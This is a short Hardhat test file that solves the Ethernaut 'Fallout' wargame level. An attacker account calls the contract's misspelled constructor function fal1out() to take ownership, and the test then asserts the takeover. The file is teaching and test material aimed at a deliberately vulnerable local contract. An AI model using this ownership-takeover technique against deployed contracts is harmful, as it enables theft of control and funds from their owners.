import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { toWei } from "scripts/utils";
import { Fallout } from "typechain-types";

// Challenge description

// Claim ownership of the contract below to complete this level.

describe("Ethernaut - Fallout", async () => {
  let fallout: Fallout;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    fallout = await ethers
      .getContractFactory("Fallout", owner)
      .then((f) => f.deploy());
  });

  it("Hacks", async () => {
    await fallout.connect(attacker).fal1out({ value: toWei("0.01") });

    expect(await fallout.owner()).equal(attacker.address);
  });
});
